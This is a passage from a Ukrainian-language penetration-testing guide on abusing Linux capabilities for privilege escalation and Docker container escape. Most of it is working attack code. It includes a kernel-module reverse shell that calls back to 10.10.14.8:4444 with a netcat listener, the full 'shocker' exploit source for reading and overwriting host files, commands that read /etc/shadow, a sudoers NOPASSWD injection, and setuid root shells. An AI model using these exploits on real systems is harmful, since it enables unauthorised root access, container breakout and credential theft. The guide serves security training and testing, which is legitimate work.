У наступному прикладі бінарний файл **`python`** має цю можливість.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
За замовчуванням команда **`modprobe`** перевіряє список залежностей та файли карт в каталозі **`/lib/modules/$(uname -r)`**.\
Для того щоб скористатися цим, створимо фальшиву папку **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Потім **скомпілюйте модуль ядра, ви можете знайти 2 приклади нижче і скопіюйте** його в цю папку:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Нарешті, виконайте необхідний код Python для завантаження цього модуля ядра:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Приклад 2 з бінарним файлом**

У наступному прикладі бінарний файл **`kmod`** має цю можливість.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Це означає, що можна використовувати команду **`insmod`** для вставки ядерного модуля. Слідуйте прикладу нижче, щоб отримати **зворотню оболонку**, зловживаючи цим привілеєм.

**Приклад з середовищем (втеча з Docker)**

Ви можете перевірити увімкнені можливості всередині контейнера Docker, використовуючи:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
У попередньому виводі ви можете побачити, що можливість **SYS\_MODULE** увімкнена.

**Створіть** ядро **модуля**, яке буде виконувати зворотню оболонку, та **Makefile** для його **компіляції**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Пробіл перед кожним словом make в файлі Makefile **повинен бути табуляцією, а не пробілами**!
{% endhint %}

Виконайте `make`, щоб скомпілювати це.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Нарешті, запустіть `nc` всередині оболонки та **завантажте модуль** з іншої оболонки, і ви захопите оболонку в процесі nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Код цієї техніки був скопійований з лабораторії "Зловживання можливістю SYS\_MODULE" з** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Інший приклад цієї техніки можна знайти за посиланням [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) дозволяє процесу **обійти дозволи для читання файлів та для читання та виконання каталогів**. Його основне використання полягає в пошуку файлів або читанні. Однак він також дозволяє процесу використовувати функцію `open_by_handle_at(2)`, яка може отримати доступ до будь-якого файлу, включаючи ті, що знаходяться поза простором імен точки монтування процесу. Ідентифікатор, використаний в `open_by_handle_at(2)`, повинен бути непрозоримим ідентифікатором, отриманим за допомогою `name_to_handle_at(2)`, але він може містити чутливу інформацію, таку як номери inode, які піддаються втручанню. Потенціал для експлуатації цієї можливості, особливо в контексті контейнерів Docker, був продемонстрований Себастьяном Крамером за допомогою експлойту shocker, як аналізується [тут](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Це означає, що ви можете** **обійти перевірки дозволів на читання файлів та перевірки дозволів на читання/виконання каталогів.**

**Приклад з бінарним файлом**

Бінарний файл зможе читати будь-який файл. Таким чином, якщо файл, наприклад, tar, має цю можливість, він зможе прочитати файл тіні:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Приклад з binary2**

У цьому випадку давайте припустимо, що бінарний файл **`python`** має цю можливість. Щоб переглянути файли кореневого каталогу, ви можете виконати:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
І для того, щоб прочитати файл, ви можете виконати:
```python
print(open("/etc/shadow", "r").read())
```
**Приклад у середовищі (втеча з Docker)**

Ви можете перевірити увімкнені можливості всередині контейнера Docker за допомогою:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
У попередньому виводі можна побачити, що можливість **DAC\_READ\_SEARCH** увімкнена. В результаті контейнер може **налагоджувати процеси**.

Ви можете дізнатися, як працює наступне використання в [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), але в описі **CAP\_DAC\_READ\_SEARCH** не тільки дозволяє нам пересуватися по файловій системі без перевірок дозволів, але також явно вилучає будь-які перевірки на _**open\_by\_handle\_at(2)**_ і **може дозволити нашому процесу доступ до чутливих файлів, відкритих іншими процесами**.

Оригінальний експлойт, який використовує ці дозволи для читання файлів з хоста, можна знайти тут: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), наведений нижче **модифікована версія, яка дозволяє вказати файл, який ви хочете прочитати як перший аргумент і вивести його в файл.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
Експлойт повинен знайти вказівник на щось, що змонтовано на хості. Оригінальний експлойт використовував файл /.dockerinit, а ця модифікована версія використовує /etc/hostname. Якщо експлойт не працює, можливо, вам потрібно встановити інший файл. Щоб знайти файл, який змонтований на хості, просто виконайте команду mount:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Код цієї техніки був скопійований з лабораторії "Зловживання можливістю DAC\_READ\_SEARCH" з** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) - найбільш важлива подія з кібербезпеки в **Іспанії** та одна з найважливіших в **Європі**. З **місією просування технічних знань**, цей конгрес є важливою точкою зустрічі для професіоналів технологій та кібербезпеки у будь-якій галузі.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Це означає, що ви можете обійти перевірку дозволів на запис будь-якого файлу, тому ви можете записувати будь-який файл.**

Є багато файлів, які ви можете **перезаписати для підвищення привілеїв,** [**ви можете отримати ідеї тут**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Приклад з бінарним файлом**

У цьому прикладі vim має цю можливість, тому ви можете змінювати будь-який файл, наприклад _passwd_, _sudoers_ або _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Приклад з бінарним файлом 2**

У цьому прикладі бінарний файл **`python`** матиме цю можливість. Ви можете використовувати Python для перезапису будь-якого файлу:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Приклад з середовищем + CAP\_DAC\_READ\_SEARCH (Втеча з Docker)**

Ви можете перевірити увімкнені можливості всередині контейнера Docker за допомогою:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Спочатку прочитайте попередній розділ, який [**використовує можливість DAC\_READ\_SEARCH для читання довільних файлів**](linux-capabilities.md#cap\_dac\_read\_search) хоста та **скомпілюйте** експлойт. \
Потім **скомпілюйте наступну версію експлойту shocker**, яка дозволить вам **записувати довільні файли** в файлову систему хоста:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Для виходу з контейнера Docker ви можете **завантажити** файли `/etc/shadow` та `/etc/passwd` з хоста, **додати** до них **нового користувача** та використати **`shocker_write`**, щоб їх перезаписати. Потім **зайти** через **ssh**.

**Код цієї техніки був скопійований з лабораторії "Зловживання можливістю DAC\_OVERRIDE" з** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Це означає, що можна змінювати власника будь-якого файлу.**

**Приклад з бінарним файлом**

Допустимо, що у бінарного файлу **`python`** є ця можливість, ви можете **змінити власника** файлу **shadow**, **змінити пароль root** та підняти привілеї:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Або з **`ruby`** бінарним файлом, який має цю можливість:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Це означає, що можна змінити дозвіл на будь-який файл.**

**Приклад з бінарним файлом**

Якщо у Python є ця можливість, ви можете змінити дозвіл на файл тіні, **змінити пароль root** та підвищити привілеї:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Це означає, що можливо встановити ефективний ідентифікатор користувача створеного процесу.**

**Приклад з бінарним файлом**

Якщо у python є ця **здатність**, ви можете дуже легко зловживати нею для підвищення привілеїв до root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Ще один спосіб:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Це означає, що можливо встановити ефективний ідентифікатор групи створеного процесу.**

Є багато файлів, які ви можете **перезаписати для підвищення привілеїв,** [**ви можете отримати ідеї тут**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Приклад з бінарним файлом**

У цьому випадку вам слід шукати цікаві файли, які група може прочитати, оскільки ви можете уособлювати будь-яку групу:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Після того, як ви знайшли файл, який можна використовувати (через читання або запис), щоб підвищити привілеї, ви можете **отримати оболонку, підміняючи цікаву групу** за допомогою:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
У цьому випадку група shadow була підроблена, тому ви можете прочитати файл `/etc/shadow`:
```bash
cat /etc/shadow
```
Якщо встановлено **docker**, ви можете **імітувати** групу **docker** та використовувати її для спілкування з [**сокетом docker** та підвищення привілеїв](./#writable-docker-socket).

## CAP\_SETFCAP

**Це означає, що можна встановлювати можливості для файлів та процесів**

**Приклад з бінарним файлом**

Якщо у Python є ця **можливість**, ви можете дуже легко використовувати її для підвищення привілеїв до root:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Зверніть увагу, що якщо ви встановите нову можливість для бінарного файлу за допомогою CAP\_SETFCAP, ви втратите цю можливість.
{% endhint %}

Якщо у вас є [можливість SETUID](linux-capabilities.md#cap\_setuid), ви можете перейти до її розділу, щоб побачити, як підвищити привілеї.

**Приклад з середовищем (втеча з Docker)**

За замовчуванням можливість **CAP\_SETFCAP надається процесу всередині контейнера в Docker**. Ви можете перевірити це, зробивши щось на зразок:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Ця можливість дозволяє **надавати будь-яку іншу можливість для бінарних файлів**, тому ми можемо подумати про **втечу** з контейнера, **зловживовуючи будь-якими іншими втечами можливостей**, згаданими на цій сторінці.\
Однак, якщо ви спробуєте, наприклад, надати можливості CAP\_SYS\_ADMIN та CAP\_SYS\_PTRACE для бінарного файлу gdb, ви побачите, що ви можете їх надати, але **бінарний файл не зможе виконатися після цього**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[З документації](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Дозволені: Це **обмежуючий надмножинний набір для ефективних можливостей**, які може припустити потік. Це також обмежуючий надмножинний набір для можливостей, які можуть бути додані до успадкованого набору потоком, який **не має можливості CAP\_SETPCAP** у своєму ефективному наборі._\
Здається, що дозволені можливості обмежують ті, які можна використовувати.\
Однак Docker також надає **CAP\_SETPCAP** за замовчуванням, тому ви, можливо, зможете **встановлювати нові можливості всередині успадкованих**.\
Проте, у документації цього cap: _CAP\_SETPCAP : \[…] **додавати будь-яку можливість з обмеженого набору потоку, що викликається, до його успадкованого набору**_.\
Здається, що ми можемо додавати до успадкованого набору лише можливості з обмеженого набору. Це означає, що **ми не можемо додавати нові можливості, такі як CAP\_SYS\_ADMIN або CAP\_SYS\_PTRACE в успадкований набір для підвищення привілеїв**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) надає доступ до числа чутливих операцій, включаючи доступ до `/dev/mem`, `/dev/kmem` або `/proc/kcore`, зміну `mmap_min_addr`, доступ до системних викликів `ioperm(2)` та `iopl(2)`, а також різні дискові команди. Ця можливість також дозволяє використовувати `FIBMAP ioctl(2)`, що викликало проблеми у [минулому](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Згідно зі сторінкою довідки, це також дозволяє власнику описово `виконувати ряд операцій, специфічних для пристрою, на інших пристроях`.

Це може бути корисно для **підвищення привілеїв** та **виходу з Docker.**

## CAP\_KILL

**Це означає, що можливо вбити будь-який процес.**

**Приклад з бінарним файлом**

Давайте припустимо, що бінарний файл **`python`** має цю можливість. Якщо ви також зможете **змінити деяку службу або конфігурацію сокету** (або будь-який файл конфігурації, пов'язаний із службою), ви зможете вставити задній хід, а потім вбити процес, пов'язаний із цією службою, і зачекати, поки новий файл конфігурації буде виконаний з вашим заднім ходом.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Підвищення привілеїв за допомогою kill**

Якщо у вас є можливості kill і запущена **програма node в якості root** (або в якості іншого користувача), ви, ймовірно, можете **надіслати** їй **сигнал SIGUSR1** і змусити її **відкрити відладчик node**, до якого ви зможете підключитися.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) - найбільш важлива подія з кібербезпеки в **Іспанії** та одна з найважливіших в **Європі**. З **місією просування технічних знань**, цей конгрес є важливою точкою зустрічі для професіоналів у галузі технологій та кібербезпеки у будь-якій дисципліні.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Це означає, що можливо слухати будь-який порт (навіть привілейовані).** Ви не можете безпосередньо підвищити привілеї з цією можливістю.

**Приклад з бінарним файлом**

Якщо у **`python`** є ця можливість, він зможе слухати будь-який порт та навіть підключатися з нього до будь-якого іншого порту (деякі служби вимагають підключень з конкретних привілейованих портів)

{% tabs %}
{% tab title="Слухати" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Підключення" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) можливість дозволяє процесам **створювати RAW та PACKET сокети**, що дозволяє їм генерувати та відправляти довільні мережеві пакети. Це може призвести до ризиків безпеки в контейнеризованих середовищах, таких як підробка пакетів, впровадження трафіку та обхід мережевих контролів доступу. Зловмисники можуть використовувати це для втручання в маршрутизацію контейнерів або компрометації безпеки мережі хоста, особливо без належного захисту брандмауером. Крім того, **CAP_NET_RAW** є важливим для привілейованих контейнерів для підтримки операцій, таких як ping через RAW ICMP запити.

**Це означає, що можливо перехоплювати трафік.** Ви не можете безпосередньо підвищити привілеї за допомогою цієї можливості.

**Приклад з використанням бінарного файлу**

Якщо у бінарного файлу **`tcpdump`** є ця можливість, ви зможете використовувати його для захоплення мережевої інформації.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Зверніть увагу, що якщо **середовище** надає цю можливість, ви також можете використовувати **`tcpdump`** для перехоплення трафіку.

**Приклад з бінарним 2**

Наступний приклад - це код на **`python2`**, який може бути корисним для перехоплення трафіку інтерфейсу "**lo**" (**localhost**). Код походить з лабораторії "_The Basics: CAP-NET\_BIND + NET\_RAW_" з [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

